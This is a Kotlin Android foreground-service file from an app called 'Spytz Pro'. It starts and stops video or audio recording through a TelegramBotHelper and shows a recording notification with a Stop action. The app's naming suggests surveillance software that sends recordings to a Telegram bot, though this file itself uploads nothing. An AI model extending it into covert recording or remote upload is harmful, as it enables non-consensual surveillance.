package com.spy.tz

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import android.R.drawable.ic_dialog_info // Fixed: Using system icon instead of missing local one

class NotificationService : Service() {

    private var serviceJob: Job? = null
    private var isRecording = false
    private var recordingType: String = "" // "VIDEO" or "AUDIO"
    private lateinit var telegramBotHelper: TelegramBotHelper

    companion object {
        const val CHANNEL_ID = "Spytz_Service_Channel"
        const val NOTIFICATION_ID = 1
        const val ACTION_STOP_RECORDING = "com.spy.tz.STOP_RECORDING"
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        telegramBotHelper = TelegramBotHelper(this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            "START_VIDEO" -> {
                isRecording = true
                recordingType = "VIDEO"
                // Fixed: Call .build() to get Notification object from Builder
                startForeground(NOTIFICATION_ID, createNotification("Video Recording...", true).build())
            }
            "START_AUDIO" -> {
                isRecording = true
                recordingType = "AUDIO"
                // Fixed: Call .build()
                startForeground(NOTIFICATION_ID, createNotification("Voice Recording...", true).build())
            }
            ACTION_STOP_RECORDING -> {
                stopRecordingAndNotify()
            }
        }
        return START_STICKY
    }

    private fun stopRecordingAndNotify() {
        isRecording = false
        if (recordingType == "VIDEO") {
            val file = telegramBotHelper.stopVideoRecording()
            android.util.Log.d("NotificationService", "Video Stopped. File: $file")
        } else if (recordingType == "AUDIO") {
            val file = telegramBotHelper.stopVoiceRecording()
            android.util.Log.d("NotificationService", "Audio Stopped. File: $file")
        }
        
        stopForeground(true)
        stopSelf()
    }

    private fun createNotification(title: String, showProgress: Boolean): NotificationCompat.Builder {
        // Fixed: Create a new Intent with Class constructor instead of setting package manually
        val intent = Intent(this, NotificationService::class.java).apply {
            action = ACTION_STOP_RECORDING
        }
        
        val pendingIntent = PendingIntent.getService(
            this,
            0,
            intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Spytz Pro - ${if(recordingType=="VIDEO") "Video" else "Audio"} Rec")
            .setContentText(title)
            .setSmallIcon(ic_dialog_info) // Fixed: Using system icon ID
            .addAction(android.R.drawable.ic_menu_close_clear_cancel, "Stop", pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setOngoing(true)
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Spytz Background Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Shows recording status"
            }
            val notificationManager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }
}
